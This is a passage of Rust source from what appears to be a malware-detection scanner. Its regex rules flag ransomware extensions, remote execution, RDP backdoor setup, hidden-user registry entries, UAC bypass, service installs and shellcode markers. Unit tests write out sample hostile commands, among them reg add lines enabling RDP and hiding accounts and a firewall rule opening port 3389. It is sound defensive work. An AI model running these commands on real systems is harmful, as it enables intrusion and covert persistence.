                    r#"(?i)\b(?:CopyFromScreen|Graphics\.CopyFromScreen|PrintScreen|BitBlt)\b"#,
                )
                .unwrap(),
                "screenshot",
            ),
        ]
    });
    for (re, kind) in PATTERNS.iter() {
        if re.is_match(deobfuscated) {
            if env.traits.iter().any(|t| {
                matches!(
                    t, crate::traits::Trait::InputCapture { capture_kind: c } if c == kind
                )
            }) {
                continue;
            }
            env.traits.push(crate::traits::Trait::InputCapture {
                capture_kind: kind.to_string(),
            });
        }
    }
}

/// Ransomware file extension marker. Strong indicator when combined
/// with AntiRecovery (vssadmin delete shadows).
fn scan_ransom_ext(deobfuscated: &str, env: &mut Environment) {
    use once_cell::sync::Lazy;
    use regex::Regex;
    static EXT_RE: Lazy<Regex> = Lazy::new(|| {
        Regex::new(r#"(?i)\.(?:locked|encrypted|locky|wcry|wannacry|ryuk|conti|lockbit|makop|dharma|cerber|cryptolocker|teslacrypt|crypt|enc|onion|payment)\b"#)
            .expect("ransom ext re")
    });
    let mut seen: std::collections::HashSet<String> = std::collections::HashSet::new();
    for m in EXT_RE.find_iter(deobfuscated) {
        let ext = m.as_str().to_ascii_lowercase();
        if !seen.insert(ext.clone()) {
            continue;
        }
        if env.traits.iter().any(|t| {
            matches!(
                t, crate::traits::Trait::RansomFileExtension { extension: e } if e == &ext
            )
        }) {
            continue;
        }
        env.traits
            .push(crate::traits::Trait::RansomFileExtension { extension: ext });
    }
}

/// WinRM / WMI remote execution.
fn scan_remote_exec(deobfuscated: &str, env: &mut Environment) {
    use once_cell::sync::Lazy;
    use regex::Regex;
    static WINRM_RE: Lazy<Regex> = Lazy::new(|| {
        Regex::new(r#"(?i)\b(?:winrm(?:\.(?:cmd|exe))?\s+(?:invoke|i)\s+[^\r\n]*?(?:[-/]r(?:emote)?[:=]?\s*)(\S+)|winrs(?:\.exe)?\s+[-/]r(?:emote)?[:=]?\s*(\S+)|Invoke-WmiMethod\b[^\r\n]*?-ComputerName\s+(\S+)|Set-WmiInstance\b[^\r\n]*?-ComputerName\s+(\S+))"#)
            .expect("winrm re")
    });
    let mut seen: std::collections::HashSet<String> = std::collections::HashSet::new();
    for caps in WINRM_RE.captures_iter(deobfuscated) {
        let host = caps
            .get(1)
            .or_else(|| caps.get(2))
            .or_else(|| caps.get(3))
            .or_else(|| caps.get(4))
            .map(|m| {
                m.as_str()
                    .trim_matches(|c: char| c == '"' || c == '\'')
                    .to_string()
            })
            .unwrap_or_default();
        let tool = if caps
            .get(0)
            .map(|m| m.as_str().to_ascii_lowercase().contains("winrm"))
            .unwrap_or(false)
        {
            "winrm"
        } else if caps
            .get(0)
            .map(|m| m.as_str().to_ascii_lowercase().contains("winrs"))
            .unwrap_or(false)
        {
            "winrs"
        } else if caps
            .get(0)
            .map(|m| m.as_str().to_ascii_lowercase().contains("invoke-wmi"))
            .unwrap_or(false)
        {
            "Invoke-WmiMethod"
        } else {
            "Set-WmiInstance"
        };
        let key = format!("{tool}\0{host}");
        if !seen.insert(key) {
            continue;
        }
        if env.traits.iter().any(|t| {
            matches!(
                t, crate::traits::Trait::RemoteExec { tool: tl, target_host: h }
                    if tl == tool && h == &host
            )
        }) {
            continue;
        }
        env.traits.push(crate::traits::Trait::RemoteExec {
            tool: tool.to_string(),
            target_host: host,
        });
    }
}

/// Remote-access backdoor setup: RDP enablement, Remote Desktop firewall
/// opening, and Winlogon hidden-user registry entries.
fn scan_remote_access(deobfuscated: &str, env: &mut Environment) {
    if !has_remote_access_atom(deobfuscated) {
        return;
    }

    use once_cell::sync::Lazy;
    use regex::Regex;
    static RDP_ENABLE_RE: Lazy<Regex> = Lazy::new(|| {
        Regex::new(
            r#"(?im)^[^\r\n]*\breg(?:\.exe)?\s+add\s+["']?[^"'\r\n]*Terminal Server[^"'\r\n]*["']?[^\r\n]*/v\s+["']?(AllowTSConnections|fDenyTSConnections)["']?[^\r\n]*/d\s+(0x1|1|0x0|0)\b[^\r\n]*"#,
        )
        .expect("rdp enable regex")
    });
    static HIDDEN_USER_RE: Lazy<Regex> = Lazy::new(|| {
        Regex::new(
            r#"(?im)^[^\r\n]*\breg(?:\.exe)?\s+add\s+["']?[^"'\r\n]*Winlogon\\SpecialAccounts\\UserList["']?[^\r\n]*/v\s+["']?([^"'\s]+)["']?[^\r\n]*/d\s+(?:0x0|0)\b[^\r\n]*"#,
        )
        .expect("hidden user regex")
    });
    static RDP_MULTIPLE_SESSIONS_RE: Lazy<Regex> = Lazy::new(|| {
        Regex::new(
            r#"(?im)^[^\r\n]*\breg(?:\.exe)?\s+add\s+["']?[^"'\r\n]*Winlogon["']?[^\r\n]*/v\s+["']?AllowMultipleTSSessions["']?[^\r\n]*/d\s+(?:0x1|1)\b[^\r\n]*"#,
        )
        .expect("rdp multiple sessions regex")
    });
    static RDP_SINGLE_SESSION_RE: Lazy<Regex> = Lazy::new(|| {
        Regex::new(
            r#"(?im)^[^\r\n]*\breg(?:\.exe)?\s+add\s+["']?[^"'\r\n]*Terminal Server[^"'\r\n]*["']?[^\r\n]*/v\s+["']?fSingleSessionPerUser["']?[^\r\n]*/d\s+(?:0x0|0)\b[^\r\n]*"#,
        )
        .expect("rdp single session regex")
    });
    static RDP_TIMEOUT_RE: Lazy<Regex> = Lazy::new(|| {
        Regex::new(
            r#"(?im)^[^\r\n]*\breg(?:\.exe)?\s+add\s+["']?[^"'\r\n]*Terminal Server\\WinStations\\RDP-Tcp["']?[^\r\n]*/v\s+["']?(MaxIdleTime|MaxConnectionTime)["']?[^\r\n]*/d\s+(?:0x0|0)\b[^\r\n]*"#,
        )
        .expect("rdp timeout regex")
    });
    static RDP_FIREWALL_RE: Lazy<Regex> = Lazy::new(|| {
        Regex::new(
            r#"(?im)^[^\r\n]*\bnetsh(?:\.exe)?\s+advfirewall\s+firewall\s+add\s+rule[^\r\n]*(?:Remote Desktop|localport\s*=\s*3389)[^\r\n]*action\s*=\s*allow[^\r\n]*"#,
        )
        .expect("rdp firewall regex")
    });
    let mut push = |technique: &str, target: String, command: String| {
        if env.traits.iter().any(|t| {
            matches!(
                t,
                crate::traits::Trait::RemoteAccess { technique: tk, target: tg, .. }
                    if tk == technique && tg == &target
            )
        }) {
            return;
        }
        env.traits.push(crate::traits::Trait::RemoteAccess {
            technique: technique.to_string(),
            target,
            command,
        });
    };
    for caps in RDP_ENABLE_RE.captures_iter(deobfuscated) {
        let value_name = caps
            .get(1)
            .map(|m| m.as_str().to_ascii_lowercase())
            .unwrap_or_default();
        let value = caps
            .get(2)
            .map(|m| m.as_str().to_ascii_lowercase())
            .unwrap_or_default();
        let enables_rdp = match value_name.as_str() {
            "allowtsconnections" => value == "1" || value == "0x1",
            "fdenytsconnections" => value == "0" || value == "0x0",
            _ => false,
        };
        if !enables_rdp {
            continue;
        }
        let command = caps
            .get(0)
            .map(|m| m.as_str().trim().to_string())
            .unwrap_or_default();
        push("rdp-enable", "Terminal Server".to_string(), command);
    }
    for caps in HIDDEN_USER_RE.captures_iter(deobfuscated) {
        let target = caps
            .get(1)
            .map(|m| m.as_str().to_string())
            .unwrap_or_default();
        if target.is_empty() {
            continue;
        }
        let command = caps
            .get(0)
            .map(|m| m.as_str().trim().to_string())
            .unwrap_or_default();
        push("hidden-user", target, command);
    }
    for m in RDP_MULTIPLE_SESSIONS_RE.find_iter(deobfuscated) {
        push(
            "rdp-multiple-sessions",
            "AllowMultipleTSSessions".to_string(),
            m.as_str().trim().to_string(),
        );
    }
    for m in RDP_SINGLE_SESSION_RE.find_iter(deobfuscated) {
        push(
            "rdp-single-session-disabled",
            "fSingleSessionPerUser".to_string(),
            m.as_str().trim().to_string(),
        );
    }
    for caps in RDP_TIMEOUT_RE.captures_iter(deobfuscated) {
        let target = caps
            .get(1)
            .map(|m| m.as_str().to_string())
            .unwrap_or_else(|| "RDP timeout".to_string());
        let command = caps
            .get(0)
            .map(|m| m.as_str().trim().to_string())
            .unwrap_or_default();
        push("rdp-timeout-disabled", target, command);
    }
    for m in RDP_FIREWALL_RE.find_iter(deobfuscated) {
        push(
            "rdp-firewall-open",
            "3389".to_string(),
            m.as_str().trim().to_string(),
        );
    }
}

fn has_remote_access_atom(text: &str) -> bool {
    const ATOMS: &[&str] = &[
        "terminal server",
        "allowtsconnections",
        "fdenytsconnections",
        "winlogon",
        "specialaccounts",
        "allowmultipletssessions",
        "fsinglesessionperuser",
        "rdp-tcp",
        "remote desktop",
        "3389",
    ];
    let lower = text.to_ascii_lowercase();
    ATOMS.iter().any(|atom| lower.contains(atom))
}

#[cfg(test)]
mod remote_access_prefilter_tests {
    use super::has_remote_access_atom;

    #[test]
    fn prefilter_allows_known_remote_access_shapes() {
        for text in [
            r#"reg add "HKLM\system\CurrentControlSet\Control\Terminal Server" /v "AllowTSConnections" /d 1"#,
            r#"reg add "HKLM\software\Microsoft\Windows NT\CurrentVersion\Winlogon\SpecialAccounts\UserList" /v defaultuserx /d 0"#,
            r#"reg add "HKLM\software\Microsoft\Windows NT\CurrentVersion\Winlogon" /v "AllowMultipleTSSessions" /d 1"#,
            r#"reg add "HKLM\system\CurrentControlSet\Control\Terminal Server" /v "fSingleSessionPerUser" /d 0"#,
            r#"reg add "HKLM\system\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp" /v "MaxIdleTime" /d 0"#,
            r#"netsh advfirewall firewall add rule name="Remote Desktop" localport=3389 action=allow"#,
        ] {
            assert!(has_remote_access_atom(text), "blocked: {text}");
        }
    }

    #[test]
    fn prefilter_blocks_unrelated_registry_text() {
        assert!(!has_remote_access_atom(
            r#"reg add "HKCU\Software\Classes\foo" /v bar /d baz"#,
        ));
    }
}

/// UAC bypass technique. MITRE T1548.002. Detects:
/// - Auto-elevate-binary triggers (fodhelper/eventvwr/sdclt/computer-
///   defaults/wsreset) when paired with an `HKCU\Software\Classes\...\
///   Shell\Open\command` registry hijack (common pattern: write the
///   payload to the registry, then run the auto-elevator which reads
///   the hijacked command from HKCU and runs it elevated).
/// - cmstp /au (silent INF install with admin token)
/// - msconfig /4 (legacy UAC bypass)
/// - UAC policy weakening (`EnableLUA=0`,
///   `ConsentPromptBehaviorAdmin=0`,
///   `LocalAccountTokenFilterPolicy=1`)
fn scan_uac_bypass(deobfuscated: &str, env: &mut Environment) {
    use once_cell::sync::Lazy;
    use regex::Regex;
    if !has_uac_bypass_atom(deobfuscated) {
        return;
    }

    static PATTERNS: Lazy<Vec<(Regex, &str)>> = Lazy::new(|| {
        vec![
            (Regex::new(r"(?i)\bfodhelper(?:\.exe)?\b").unwrap(), "fodhelper"),
            (Regex::new(r"(?i)\beventvwr(?:\.exe)?\b").unwrap(), "eventvwr"),
            (Regex::new(r"(?i)\bsdclt(?:\.exe)?\b").unwrap(), "sdclt"),
            (Regex::new(r"(?i)\bcomputerdefaults(?:\.exe)?\b").unwrap(), "computerdefaults"),
            (Regex::new(r"(?i)\bwsreset(?:\.exe)?\b").unwrap(), "wsreset"),
            (Regex::new(r"(?i)\bcmstp(?:\.exe)?(?:\s+[^\r\n]*)?\s+/au\b").unwrap(), "cmstp-au"),
            (Regex::new(r"(?i)\bmsconfig(?:\.exe)?\s+/4\b").unwrap(), "msconfig-4"),
            (Regex::new(r"(?i)HKCU\\Software\\Classes\\(?:ms-settings|Folder|exefile|mscfile)\\Shell\\Open\\command").unwrap(), "classes-shell-open-hijack"),
            (Regex::new(r"(?i)IColorDataProxy|ICMLuaUtil").unwrap(), "com-elevation"),
            (
                Regex::new(r#"(?i)\breg(?:\.exe)?\s+add[^\r\n]*\\Policies\\System[^\r\n]*/v\s+["']?EnableLUA["']?[^\r\n]*/d\s+["']?0["']?\b"#).unwrap(),
                "uac-enablelua-disabled",
            ),
            (
                Regex::new(r#"(?i)\bNew-ItemProperty\b[^\r\n]*Policies\\system[^\r\n]*-Name\s+EnableLUA[^\r\n]*-Value\s+0\b"#).unwrap(),
                "uac-enablelua-disabled",
            ),
            (
                Regex::new(r#"(?i)\breg(?:\.exe)?\s+add[^\r\n]*\\Policies\\System[^\r\n]*/v\s+["']?ConsentPromptBehaviorAdmin["']?[^\r\n]*/d\s+["']?0["']?\b"#).unwrap(),
                "uac-consent-prompt-disabled",
            ),
            (
                Regex::new(r#"(?i)\breg(?:\.exe)?\s+add[^\r\n]*\\Policies\\System[^\r\n]*/v\s+["']?LocalAccountTokenFilterPolicy["']?[^\r\n]*/d\s+["']?1["']?\b"#).unwrap(),
                "uac-token-filter-disabled",
            ),
        ]
    });
    for (re, tech) in PATTERNS.iter() {
        if re.is_match(deobfuscated) {
            if env.traits.iter().any(|t| {
                matches!(
                    t, crate::traits::Trait::UacBypass { technique: tk } if tk == tech
                )
            }) {
                continue;
            }
            env.traits.push(crate::traits::Trait::UacBypass {
                technique: tech.to_string(),
            });
        }
    }
}

fn has_uac_bypass_atom(text: &str) -> bool {
    const ATOMS: &[&str] = &[
        "fodhelper",
        "eventvwr",
        "sdclt",
        "computerdefaults",
        "wsreset",
        "cmstp",
        "msconfig",
        "hkcu\\software\\classes",
        "icolorproxy",
        "icolordataproxy",
        "icmluautil",
        "policies\\system",
        "enablelua",
        "consentpromptbehavioradmin",
        "localaccounttokenfilterpolicy",
    ];
    let lower = text.to_ascii_lowercase();
    ATOMS.iter().any(|atom| lower.contains(atom))
}

#[cfg(test)]
mod uac_bypass_prefilter_tests {
    use super::has_uac_bypass_atom;

    #[test]
    fn prefilter_allows_known_uac_bypass_markers() {
        for sample in [
            "fodhelper.exe",
            "eventvwr.exe",
            "sdclt.exe",
            "computerdefaults.exe",
            "wsreset.exe",
            "cmstp.exe /au payload.inf",
            "msconfig /4",
            r"HKCU\Software\Classes\ms-settings\Shell\Open\command",
            "IColorDataProxy",
            "ICMLuaUtil",
            r"HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v EnableLUA",
        ] {
            assert!(has_uac_bypass_atom(sample), "blocked marker: {sample}");
        }
    }

    #[test]
    fn prefilter_blocks_generic_registry_and_process_text() {
        assert!(!has_uac_bypass_atom(
            r#"reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v app /d app.exe"#,
        ));
        assert!(!has_uac_bypass_atom("taskkill /f /im WINWORD.EXE"));
    }
}

/// `sc create` service install — MITRE T1543.003.
fn scan_service_install(deobfuscated: &str, env: &mut Environment) {
    use once_cell::sync::Lazy;
    use regex::Regex;
    static SC_CREATE_RE: Lazy<Regex> = Lazy::new(|| {
        Regex::new(r#"(?i)\bsc(?:\.exe)?\s+create\s+(\S+)(?:\s+[^\r\n]*?\bbinPath=\s*(?:"([^"]+)"|(\S+)))?"#)
            .expect("sc create re")
    });
    for caps in SC_CREATE_RE.captures_iter(deobfuscated) {
        let name = caps
            .get(1)
            .map(|m| m.as_str().to_string())
            .unwrap_or_default();
        let path = caps
            .get(2)
            .or_else(|| caps.get(3))
            .map(|m| m.as_str().to_string())
            .unwrap_or_default();
        if env.traits.iter().any(|t| {
            matches!(
                t, crate::traits::Trait::ServiceInstall { service_name: n, .. } if n == &name
            )
        }) {
            continue;
        }
        env.traits.push(crate::traits::Trait::ServiceInstall {
            service_name: name,
            bin_path: path,
        });
    }
}

/// PowerShell `Start-Sleep -Seconds N` — beacon-style C2 cadence.
fn scan_beacon_sleep(deobfuscated: &str, env: &mut Environment) {
    use once_cell::sync::Lazy;
    use regex::Regex;
    static SLEEP_RE: Lazy<Regex> = Lazy::new(|| {
        Regex::new(r#"(?i)Start-Sleep\s+(?:-Seconds\s+)?(\d{1,7})"#).expect("start-sleep re")
    });
    let mut seen: std::collections::HashSet<u32> = std::collections::HashSet::new();
    for caps in SLEEP_RE.captures_iter(deobfuscated).take(8) {
        let secs = caps
            .get(1)
            .and_then(|m| m.as_str().parse::<u32>().ok())
            .unwrap_or(0);
        // Trivial 1-3s sleeps are usually retry/init waits, not C2 beacon.
        // Beacon cadences are typically 10s+ (often minutes).
        if secs < 5 || !seen.insert(secs) {
            continue;
        }
        if env.traits.iter().any(|t| {
            matches!(
                t, crate::traits::Trait::BeaconSleep { seconds: s } if *s == secs
            )
        }) {
            continue;
        }
        env.traits
            .push(crate::traits::Trait::BeaconSleep { seconds: secs });
    }
}

/// Shellcode marker — `$shellcode = ...`, NOP-sled `0x90,0x90,...`,
/// `\x90\x90` literal, or a `[Byte[]] $var = 0xNN, 0xNN, …` array that
/// starts with one of the well-known x64/x86 Metasploit-family shellcode
/// prologues (`fc 48 83 e4 f0` for x64, `fc e8 …` for x86 GetEIP).
fn scan_shellcode_marker(deobfuscated: &str, env: &mut Environment) {
    use once_cell::sync::Lazy;
    use regex::Regex;
    if !has_shellcode_marker_atom(deobfuscated) {
        return;
    }

    static SHELLCODE_VAR_RE: Lazy<Regex> =
        Lazy::new(|| Regex::new(r#"(?i)\$(\w*shellcode\w*)\s*="#).expect("shellcode var"));
    static NOP_SLED_RE: Lazy<Regex> =
        Lazy::new(|| Regex::new(r#"(?:0x90\s*,\s*){8,}|(?:\\x90){8,}"#).expect("nop sled"));
    // `[Byte[]] $x = 0xfc, 0x48, 0x83, 0xe4, 0xf0` — Metasploit x64
    // reverse_*/meterpreter prologue (`cld; sub rsp, 0xf0`).
    static MSF_X64_PROLOGUE_RE: Lazy<Regex> = Lazy::new(|| {
        Regex::new(
            r#"(?i)\[\s*Byte\s*\[\s*\]\s*\]\s*\$\w+\s*=\s*0xfc\s*,\s*0x48\s*,\s*0x83\s*,\s*0xe4\s*,\s*0xf0"#,
        )
        .expect("msf x64 prologue")
    });
    // `[Byte[]] $x = 0xfc, 0xe8` — Metasploit x86 GetEIP prologue
    // (`cld; call <next>`). 0xe8 alone is too noisy; require the byte-array
    // wrapper to anchor it.
    static MSF_X86_PROLOGUE_RE: Lazy<Regex> = Lazy::new(|| {
        Regex::new(r#"(?i)\[\s*Byte\s*\[\s*\]\s*\]\s*\$\w+\s*=\s*0xfc\s*,\s*0xe8"#)
            .expect("msf x86 prologue")
    });
    if let Some(m) = SHELLCODE_VAR_RE.find(deobfuscated) {
        let evidence = m.as_str().to_string();
        if !env.traits.iter().any(|t| {
            matches!(
                t, crate::traits::Trait::ShellcodeMarker { evidence: e } if e == &evidence
            )
        }) {
            env.traits
                .push(crate::traits::Trait::ShellcodeMarker { evidence });
        }
    }
    if NOP_SLED_RE.find(deobfuscated).is_some()
        && !env.traits.iter().any(|t| matches!(t, crate::traits::Trait::ShellcodeMarker { evidence } if evidence == "nop-sled"))
    {
        env.traits.push(crate::traits::Trait::ShellcodeMarker {
            evidence: "nop-sled".to_string(),
        });
    }
    for (re, label) in &[
        (&*MSF_X64_PROLOGUE_RE, "msf-x64-prologue"),
        (&*MSF_X86_PROLOGUE_RE, "msf-x86-prologue"),
    ] {
        if re.find(deobfuscated).is_some()
            && !env.traits.iter().any(|t| {
                matches!(
                    t, crate::traits::Trait::ShellcodeMarker { evidence } if evidence == label
                )
            })
        {
            env.traits.push(crate::traits::Trait::ShellcodeMarker {
                evidence: (*label).to_string(),
            });
        }
    }
}

fn has_shellcode_marker_atom(text: &str) -> bool {
    contains_ascii_case_insensitive_atom(text, b"shellcode")
        || text.contains("0x90")
        || text.contains(r"\x90")
        || contains_ascii_case_insensitive_atom(text, b"0xfc")
}

fn scan_script_host_deob_text(deobfuscated: &str, env: &mut Environment) {
    if !contains_ascii_case_insensitive_atom(deobfuscated, b"cscript")
        && !contains_ascii_case_insensitive_atom(deobfuscated, b"wscript")
    {
        return;
    }

    use once_cell::sync::Lazy;
    use regex::Regex;
    static SCRIPT_HOST_RE: Lazy<Regex> = Lazy::new(|| {
        Regex::new(
            r#"(?im)(?:^|[\s&|('"`(])(?P<cmd>(?:[A-Za-z]:[\\/][^\r\n&|'"`()]*)?(?P<host>[cw]script)(?:\.exe)?\s+[^\r\n]*)"#,
        )
        .expect("script host command")
    });

    for caps in SCRIPT_HOST_RE.captures_iter(deobfuscated) {
        let Some(cmd_match) = caps.name("cmd") else {
            continue;
        };
        if script_host_match_is_registry_value(deobfuscated, cmd_match.start()) {
            continue;
        }
        let host = caps
            .name("host")
            .map(|m| m.as_str().to_ascii_lowercase())
            .unwrap_or_default();
        let command = trim_script_host_wrapper_tail(cmd_match.as_str());
        let Some(src) = script_host_source_arg(command) else {
            continue;
        };
        if !script_host_source_looks_script_like(&src) {
            continue;
        }
        push_script_host_exec_trait(&host, src, env);
    }
}

fn push_script_host_exec_trait(host: &str, src: String, env: &mut Environment) {
    let already = env.traits.iter().any(|t| match (host, t) {
        ("cscript", crate::traits::Trait::CscriptExec { src: s }) => s == &src,
        ("wscript", crate::traits::Trait::WscriptExec { src: s }) => s == &src,
        _ => false,
    });
    if already {
        return;
    }
    match host {
        "cscript" => env.traits.push(crate::traits::Trait::CscriptExec { src }),
        "wscript" => env.traits.push(crate::traits::Trait::WscriptExec { src }),
        _ => {}
    }
}

fn script_host_match_is_registry_value(text: &str, start: usize) -> bool {
    let line_start = text[..start]
        .rfind(['\n', '\r'])
        .map(|idx| idx + 1)
        .unwrap_or(0);
    let prefix = text[line_start..start].to_ascii_lowercase();
    prefix.contains("reg add") && (prefix.contains(" /d ") || prefix.contains(" -d "))
}

fn trim_script_host_wrapper_tail(command: &str) -> &str {
    let mut end = command.len();
    for marker in ["') do", "\") do", "` ) do", "\\n", "\n", "\r"] {
        if let Some(idx) = command.find(marker) {
            end = end.min(idx);
        }
    }
    command[..end]
        .trim()
        .trim_end_matches([')', '\'', '"'])
        .trim()
}

fn script_host_source_arg(command: &str) -> Option<String> {
    let tokens = crate::handlers::util::split_words(command);
    for token in tokens.iter().skip(1) {
        let token = token.trim_matches(['"', '\'']);
        if token.starts_with("//") || token.starts_with('/') {
            continue;
        }
        if token.is_empty() || token.starts_with('-') {
            continue;
        }
        return Some(token.to_string());
    }
    None
}

fn script_host_source_looks_script_like(src: &str) -> bool {
    let src = src
        .trim()
        .trim_matches(['"', '\''])
        .trim_start_matches("\\\"")
        .trim_end_matches("\\\"");
    let lower = src.to_ascii_lowercase();
    [".vbs", ".vbe", ".js", ".jse", ".wsf", ".wsh"]
        .iter()
        .any(|ext| lower.ends_with(ext) || lower.contains(&format!("{ext}?")))
}

pub fn scan_deob_text(deobfuscated: &str, env: &mut Environment) {
    let scan_profile_enabled = std::env::var_os("HARRINGTON_PROFILE_DEOB_SCAN").is_some();
    macro_rules! scan_step {
        ($stage:literal, $body:block) => {{
            if scan_profile_enabled {
                let start = std::time::Instant::now();
                let traits_before = env.traits.len();
                $body
                eprintln!(
                    "harrington_profile_deob_scan scanner={} delta_ms={} bytes={} added_traits={}",
                    $stage,
                    start.elapsed().as_millis(),
                    deobfuscated.len(),
                    env.traits.len().saturating_sub(traits_before)
                );
            } else {
                $body
            }
        }};
    }

    scan_step!("self_elevation", {
        scan_self_elevation(deobfuscated, env);
    });
    scan_step!("defender_evasion", {
        scan_defender_evasion(deobfuscated, env);
    });
    scan_step!("inmem_assembly_load", {
        scan_inmem_assembly_load(deobfuscated, env);
    });
    scan_step!("lateral_movement", {
        scan_lateral_movement(deobfuscated, env);
    });
    scan_step!("anti_recovery", {
        scan_anti_recovery(deobfuscated, env);
    });
    scan_step!("evidence_cleanup", {
        scan_evidence_cleanup(deobfuscated, env);
    });
    scan_step!("network_probe", {
        scan_network_probe(deobfuscated, env);
    });
    scan_step!("account_modification", {
        scan_account_modification(deobfuscated, env);
    });
    scan_step!("file_concealment", {
        scan_file_concealment(deobfuscated, env);
    });
    scan_step!("enumeration", {
        scan_enumeration(deobfuscated, env);
    });
    scan_step!("credential_access", {
        scan_credential_access(deobfuscated, env);
    });
    scan_step!("process_injection", {
        scan_process_injection(deobfuscated, env);
    });
    scan_step!("input_capture", {
        scan_input_capture(deobfuscated, env);
    });
    scan_step!("ransom_ext", {
        scan_ransom_ext(deobfuscated, env);
    });
    scan_step!("remote_exec", {
        scan_remote_exec(deobfuscated, env);
    });
    scan_step!("remote_access", {
        scan_remote_access(deobfuscated, env);
    });
    scan_step!("uac_bypass", {
        scan_uac_bypass(deobfuscated, env);
    });
    scan_step!("service_install", {
        scan_service_install(deobfuscated, env);
    });
    scan_step!("beacon_sleep", {
        scan_beacon_sleep(deobfuscated, env);
    });
    scan_step!("shellcode_marker", {
        scan_shellcode_marker(deobfuscated, env);
    });
    scan_step!("script_host_deob_text", {
        scan_script_host_deob_text(deobfuscated, env);
    });
    scan_step!("bitsadmin_deob_text", {
        scan_bitsadmin_deob_text(deobfuscated, env);
    });
    scan_step!("python_requests_get_deob_text", {
        scan_python_requests_get_deob_text(deobfuscated, env);
    });
    scan_step!("typo_webclient_downloads", {
        scan_typo_webclient_downloads(deobfuscated, env);
    });
    scan_step!("url_launch_deob_text", {
        scan_url_launch_deob_text(deobfuscated, env);
    });
    scan_step!("rundll32_download_exports_deob_text", {
        scan_rundll32_download_exports_deob_text(deobfuscated, env);
    });
    scan_step!("certoc_deob_text", {
        scan_certoc_deob_text(deobfuscated, env);
    });
    scan_step!("desktopimgdownldr_deob_text", {
        scan_desktopimgdownldr_deob_text(deobfuscated, env);
    });
    scan_step!("process_url_arguments", {
        scan_process_url_arguments(deobfuscated, env);
    });
    scan_step!("url_variable_assignments", {
        scan_url_variable_assignments(deobfuscated, env);
    });
    scan_step!("registry_url_values", {
        scan_registry_url_values(deobfuscated, env);
    });
    scan_step!("echoed_vbs_deob_text", {
        scan_echoed_vbs_deob_text(deobfuscated, env);
    });
    scan_step!("copied_bitsadmin_alias_deob_text", {
        scan_copied_bitsadmin_alias_deob_text(deobfuscated, env);
    });
    scan_step!("copied_curl_alias_deob_text", {
        scan_copied_curl_alias_deob_text(deobfuscated, env);
    });
    scan_step!("copied_extrac32_alias_deob_text", {
        scan_copied_extrac32_alias_deob_text(deobfuscated, env);
    });
    scan_step!("copied_ftp_alias_deob_text", {
        scan_copied_ftp_alias_deob_text(deobfuscated, env);
    });
    scan_step!("copied_certreq_alias_deob_text", {
        scan_copied_certreq_alias_deob_text(deobfuscated, env);
    });
    scan_step!("copied_certoc_alias_deob_text", {
        scan_copied_certoc_alias_deob_text(deobfuscated, env);
    });
    scan_step!("copied_desktopimgdownldr_alias_deob_text", {
        scan_copied_desktopimgdownldr_alias_deob_text(deobfuscated, env);
    });
    scan_step!("copied_hh_alias_deob_text", {
        scan_copied_hh_alias_deob_text(deobfuscated, env);
    });
    scan_step!("copied_uac_alias_deob_text", {
        scan_copied_uac_alias_deob_text(deobfuscated, env);
    });
    scan_step!("copied_esentutl_alias_deob_text", {
        scan_copied_esentutl_alias_deob_text(deobfuscated, env);
    });
    scan_step!("copied_forfiles_alias_deob_text", {
        scan_copied_forfiles_alias_deob_text(deobfuscated, env);
    });
    scan_step!("copied_wmic_alias_deob_text", {
        scan_copied_wmic_alias_deob_text(deobfuscated, env);
    });
    scan_step!("copied_runas_alias_deob_text", {
        scan_copied_runas_alias_deob_text(deobfuscated, env);
    });
    scan_step!("copied_net_alias_deob_text", {
        scan_copied_net_alias_deob_text(deobfuscated, env);
    });
    scan_step!("copied_robocopy_alias_deob_text", {
        scan_copied_robocopy_alias_deob_text(deobfuscated, env);
    });
    scan_step!("copied_netsh_alias_deob_text", {
        scan_copied_netsh_alias_deob_text(deobfuscated, env);
    });
    scan_step!("copied_defender_evasion_alias_deob_text", {
        scan_copied_defender_evasion_alias_deob_text(deobfuscated, env);
    });
    scan_step!("copied_anti_recovery_alias_deob_text", {
        scan_copied_anti_recovery_alias_deob_text(deobfuscated, env);
    });
    scan_step!("copied_reg_alias_deob_text", {
        scan_copied_reg_alias_deob_text(deobfuscated, env);
    });
    scan_step!("copied_evidence_cleanup_alias_deob_text", {
        scan_copied_evidence_cleanup_alias_deob_text(deobfuscated, env);
    });
    scan_step!("copied_attrib_alias_deob_text", {
        scan_copied_attrib_alias_deob_text(deobfuscated, env);
    });
    scan_step!("copied_enumeration_alias_deob_text", {
        scan_copied_enumeration_alias_deob_text(deobfuscated, env);
    });
    scan_step!("copied_network_probe_alias_deob_text", {
        scan_copied_network_probe_alias_deob_text(deobfuscated, env);
    });
    scan_step!("copied_psexec_alias_deob_text", {
        scan_copied_psexec_alias_deob_text(deobfuscated, env);
    });
    scan_step!("copied_winrs_alias_deob_text", {
        scan_copied_winrs_alias_deob_text(deobfuscated, env);
    });
    scan_step!("copied_winrm_alias_deob_text", {
        scan_copied_winrm_alias_deob_text(deobfuscated, env);
    });
    scan_step!("copied_schtasks_alias_deob_text", {
        scan_copied_schtasks_alias_deob_text(deobfuscated, env);
    });
    scan_step!("copied_sc_alias_deob_text", {
        scan_copied_sc_alias_deob_text(deobfuscated, env);
    });
    scan_step!("copied_at_alias_deob_text", {
        scan_copied_at_alias_deob_text(deobfuscated, env);
    });
    scan_step!("copied_certutil_alias_deob_text", {
        scan_copied_certutil_alias_deob_text(deobfuscated, env);
    });
    scan_step!("copied_cmd_alias_deob_text", {
        scan_copied_cmd_alias_deob_text(deobfuscated, env);
    });
    scan_step!("copied_mshta_alias_deob_text", {
        scan_copied_mshta_alias_deob_text(deobfuscated, env);
    });
    scan_step!("copied_msiexec_alias_deob_text", {
        scan_copied_msiexec_alias_deob_text(deobfuscated, env);
    });
    scan_step!("copied_regsvr32_alias_deob_text", {
        scan_copied_regsvr32_alias_deob_text(deobfuscated, env);
    });
    scan_step!("copied_rundll32_alias_deob_text", {
        scan_copied_rundll32_alias_deob_text(deobfuscated, env);
    });
    scan_step!("curl_style_compact_flags_deob_text", {
        scan_curl_style_compact_flags_deob_text(deobfuscated, env);
    });
    scan_step!("echoed_curl_deob_text", {
        scan_echoed_curl_deob_text(deobfuscated, env);
    });
    scan_step!("curl_redirect_deob_text", {
        scan_curl_redirect_deob_text(deobfuscated, env);
    });
    scan_step!("curl_deob_text", {
        scan_curl_deob_text(deobfuscated, env);
    });
    scan_step!("wget_deob_text", {
